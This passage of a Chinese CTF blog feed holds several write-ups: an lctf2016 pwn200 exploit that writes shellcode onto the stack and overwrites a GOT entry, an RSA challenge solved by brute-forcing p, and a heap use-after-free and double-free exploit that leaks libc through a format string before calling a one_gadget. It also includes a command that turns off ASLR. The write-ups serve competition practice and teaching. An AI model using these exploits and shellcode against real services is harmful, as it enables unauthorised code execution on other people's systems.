<span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">46</span>), <span class="built_in">chr</span>(<span class="number">122</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">34</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">65</span>), <span class="built_in">chr</span>(<span class="number">77</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">82</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">79</span>), <span class="built_in">chr</span>(<span class="number">84</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">33</span>), <span class="built_in">chr</span>(<span class="number">34</span>)</span><br><span class="line">      )</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z i p   - r P   h e h e h e 2 3 3 _ I g o t r o o t ！   f l a g . z i p</span><br></pre></td></tr></table></figure><p>拿到压缩包密码，结束。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lctf2016_pwn200 writeup</title>
      <link href="/2021/10/27/lctf2016_pwn200%20writeup/"/>
      <url>/2021/10/27/lctf2016_pwn200%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec 64位保护全关，并且栈可读可写可执行，那么主要思路应该是执行shellcode了。main函数一个IO初始化和一个函数，进去发现有一个name输入，是用for - read(1)实现的，但是观察缓冲区和循环大小，发现缓冲区大小与循环次数相同，意味着如果我输入填满缓冲区，一会输出名字的时候可以泄露栈地址。sub_4007DF这个函数就是输入一个3位数值返回int。继续往下看发现它又有一个与缓冲区大小相等的一次输入，并且可以覆盖到char *dest这个指针变量，一会会将整个缓冲区以字符串形式拷贝到那个指针内的地址中。那么如果我们将ptr修改那基本是任意地址写了，加上之前泄露的站地址便可以在上面执行shellcode，但是同时也有限制，那就是这是一个字符串拷贝，如果需要在返回的时候执行shellcode那么需要填上shellcode后先放上一个jmp rsp的地址。而64位程序地址虽占8个字节但是实际高两个字节一般都是空的，后面的shellcode很可能无法拷贝。我还尝试过栈迁移，但是栈迁移需要改连续的两个为地址，也不能连续拷贝。那么可以尝试劫持got表，让它在后面执行某些函数的时候劫持到栈上面的shellcode里面。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>主要就是写在got表的地址要确定是shellcode的地址，这个可以通过自己调试去反复确定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27025</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">48</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">120</span>-<span class="number">0x28</span>-<span class="number">32</span>+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))<span class="comment">#+120</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id&#x27;</span>,<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line">payload=p64(stack_addr)+asm(shellcraft.sh())</span><br><span class="line">payload=payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400a8d&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021江西省赛RSA writeup</title>
      <link href="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/"/>
      <url>/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/</url>
      
        <content type="html"><![CDATA[<p>来源于一位师傅发的RSA的题目，这题正解是套公式，但是其实可以直接分解n。</p><p>题来康康别的师傅发给我的江西省赛的cry题，发现自己还是能很好的运用一些小技巧的，正解虽然不用分解n，但是咱还是可以分解n的hhh</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">p-q=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br></pre></td></tr></table></figure><p>题目给了n和密文，还给了p和q的关系式，但是n是600多位十进制数直接分解不太现实，即便确定了p和q的位数复杂度也不允许。而且它数据刚刚好，python无法直接表示，所以我们就很难用python写这个分解n的脚本。这里有一个很好用的东西：java大数，java大数是字符串封装的可以运算的数，那么我们就可以通过这个很好的运算了。</p><p>既然直接分析不可行的话那么采取其它策略——爆破</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>思想是确定p的位数，然后q=p+x，从高位枚举，直到p*(p+x)刚好&lt;n确定这一位数，就算p是300多位，每位枚举10中情况复杂度也不算高，那么这个就用java写脚本爆破了。</p><p>首先确定一下p的位数，这个很难简单，直接随便取若干位数为p，再算(p+x)*p与n相除，若得出来的值不超过10那基本就是这么多位数了，这里算出来位数是310位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.math.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bignumber</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        BigInteger n = <span class="keyword">new</span> BigInteger(<span class="string">&quot;27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603&quot;</span>);</span><br><span class="line">        BigInteger x = <span class="keyword">new</span> BigInteger(<span class="string">&quot;3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858&quot;</span>);</span><br><span class="line">        BigInteger i = <span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">310</span>;j&gt;=<span class="number">1</span>;j--) &#123;</span><br><span class="line">            String s=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;j-<span class="number">1</span>;k++) &#123;</span><br><span class="line">                s+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            BigInteger pow=<span class="keyword">new</span> BigInteger(s);</span><br><span class="line">            <span class="comment">//System.out.println(pow);</span></span><br><span class="line">            <span class="keyword">int</span> bit=<span class="number">10</span>;</span><br><span class="line">            BigInteger p=<span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                bit--;</span><br><span class="line">                BigInteger m=pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit)));</span><br><span class="line">                BigInteger a=m.add(i);</span><br><span class="line">                p=a.multiply(a.add(x));</span><br><span class="line">            &#125;<span class="keyword">while</span>(n.compareTo(p)==-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//System.out.println(bit);</span></span><br><span class="line">            i=i.add(pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit))));</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/1.png" alt="1"></p><p>很容易就爆破出来了，最终得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">x=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br><span class="line">q=p+x</span><br><span class="line"></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/2.png" alt="2"></p><p>得到flag=flag{9c0532a253809f180747b6da334b438f}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020浙江省赛 pwn2 writeup</title>
      <link href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/"/>
      <url>/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/</url>
      
        <content type="html"><![CDATA[<p>国庆复的盘，今天补一下</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec保护全开。</p><p>经典菜单题，没有去符号表，查看menu函数发现只有添加和删除操作，但是可以发现删除操作是通过函数指针实现的。并且分little 和 big的区别，free little就是一个free，free big 就是要把那个堆块里面的内容指向的堆块free了还要把本身给free，但是指针并没有清零。造成了UAF漏洞，并且在add的时候根据字符串长度来分配大小，并且会先读栈上，然后在strcpy拷贝，这就意味着输入不能存在\0。并且你输入的size只跟你输入大小有关，它拷贝分配的大小还是用strlen算出来长度再malloc然后strcpy，这一波操作下来就没办法溢出操作，并且由于\0截断也限制了很多。开了PIE无法unlink，和用got表泄露libc，而泄露程序基址也是比较难的(虽然正解是泄露程序基址的awa)。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>考虑劫持函数指针，直接覆盖部分来修改函数，发现freebig和freelittle函数指针都在堆上面，由于只有最后三位相同，而我们覆盖是以字节为单位的，在调试可以选择先关了ASLR，让它在确定位置上加载不妨碍调试，出了之后也就需要爆破这半个字节十六分之一的概率还是比较可观的。但是我的电脑不知道为什么特殊一点的，它程序加载的基址末五位都是0，那这样我调试就更加方便了，直接写上两个字节过去就完事了。如果你的你的机子没有这个特性可以参考以下操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo su</span><br><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>这一波操作之后会让程序和libc在确定的基址上运行，这样如果需要爆破，调试起来就更方便了，我的机子重启之后这个默认变回2的好像。</p><p>那么我们就先用double free的方式将堆块申请到伪造的区域造成堆重叠覆盖指针区域为printf，至于为什么printf呢，那是因为可以用%p泄露栈或寄存器上的变量，栈上面或多或少都会有libc的地址存在的。</p><p>那我们先添加五组堆块</p><p>第一个堆块：big ，在数据区域伪造出一个0x31大小的堆块一遍等会申请。</p><p>第二个堆块：big，把它的size区域变成0x31以便等会申请。</p><p>第三个堆块：small，用于double free 的堆块</p><p>第四个堆块：small，用于double free 的堆块</p><p>第五个堆块：small，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#交互函数会在最后完整的exp中给出</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>此时堆布局是这样的：</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png" alt="1"></p><p>箭头所指的两个地方就是要伪造堆块的区域。</p><p>然后free掉第三个第四个第三个的顺序让bin中存在两个相同的堆块，add第一个堆块的时候末尾因为有其它堆块的地址，因此直接改最后一位即可以把fd改成刚刚第二个堆伪造的size区域，等会申请到这里的堆块之后就可以直接修改末尾的指针把这个free big函数改成printf函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure><p>此时堆布局如下所示</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/2.png" alt="2"></p><p>由于改变了堆结构导致指令无法识别到堆块了，但那些不重要，我们可以看到那个原本存free big的函数已经变成了printf函数的偏移(0x9a0)。</p><p>改完之后呢，依旧是用第三个堆块和第四个堆块double free，然后把堆块申请到第一个伪造的那个地方。然后free第一个堆块，而我们这一次申请就在上面填上类似%p之类的字符，为什么能成功呢？仔细看它delete一个堆块的操作，是以堆块的地址作为参数的而不是以堆块的内容作为参数。所以如果上面放上%p之类的字符串，delete 之后就会printf这堆块上的内容，识别到%p之类的格式化字符串就会对应泄露出一些地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>做完这些操作之后可以看到一下堆块的布局。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/3.png" alt="3"></p><p>free 1之后可以泄露出一个类似libc的地址。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/4.png" alt="4"></p><p>因为这属于无差别泄露，就是说你其实也不知道这个泄露的是个什么鬼东西，那你就直接vmmap查看libc的code段加载地址在哪里，再把这个数和基址一减，得到一个偏移，那么接受到这个数值之后减去那个偏移就能固定泄露出libc的基址了。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/5.png" alt="5"></p><p>虽然泄露出来的地址属于ld.so中的地址，但是由于libc和ld.so是紧挨着的，不妨碍能通过它泄露出libc的地址，最后计算得到偏移0x5ed700。到这里泄露libc的工作就算完成啦。</p><h2 id="劫持程序流"><a href="#劫持程序流" class="headerlink" title="劫持程序流"></a>劫持程序流</h2><p>这里还是靠函数指针，既然libc地址已经泄露得到了，那么可以故技重施，再把函数指针改成system，然后参数给/bin/sh，delete之后直接getshell，非常稳，当然这里我偷懒了，我直接换成onegadget的地址了，因为后期考虑到堆块数量可能不够，它堆块指针的分配机制是这样的：</p><p>建立一个数组a，初始都为0，每次add，会把这个数组置为1，free把对应这个下标置为0。add只会考虑该数组这个下标的值为0的时候才会分配对应偏移的指针给当前add的堆块。但是由于之前我们用过了很多double free，因为有两次free是对同一个堆块操作，那个数组虽然会变成0，但是也有两次是对同一个元素操作了，我们整整又是拿出来了三个堆块，所以每次double free可用的数组指针永久少1，并且由于之前那些操作，可以利用的堆可以说以我目前的能力我是想放弃那些堆块重新开始的。因此再次的double free 只需要劫持一个函数指针为onegadget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里也很幸运，试到第三个onegadget就成功了。如果不行应该换成system然后之前再同样的方式弄出来/bin/sh字符串就行，但是我不确定堆块数量能不能够用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span 